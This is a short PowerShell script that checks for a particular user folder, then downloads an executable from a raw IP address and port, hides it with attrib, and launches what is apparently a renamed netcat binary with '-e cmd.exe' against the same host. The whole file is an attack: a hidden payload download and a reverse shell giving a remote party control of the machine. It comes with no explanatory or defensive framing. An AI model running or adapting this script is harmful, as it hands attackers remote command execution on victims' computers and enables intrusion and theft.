if (-not (Test-Path "C:\Users\Alooo")) {
    Write-Host "No"
} else {
    Invoke-WebRequest -Uri http://193.161.193.99:37515/lml.exe -OutFile C:\Users\Alooo\Downloads\lml.exe
    attrib +h C:\Users\Alooo\Downloads\lml.exe
    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv", "193.161.193.99", "37515", "-e", "cmd.exe"
}
